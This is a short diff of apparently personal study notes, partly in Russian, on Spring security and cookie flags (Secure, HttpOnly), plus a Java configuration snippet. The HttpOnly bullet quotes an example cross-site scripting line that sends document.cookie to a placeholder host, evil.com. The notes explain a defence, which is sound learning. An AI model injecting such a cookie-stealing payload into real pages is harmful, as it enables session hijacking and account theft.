@@ -1,3 +1,6 @@
+- set cookie `Secure` (protects from man in the middle)
+- `HttpOnly` недостуна из JavaScript. Защищает от атак `(new Image()).src = "http://evil.com/steal-cookie.php?cookie=" + document.cookie;`
+
 ```Java
     @Value("${spring.security.user.name}")
     private String username;
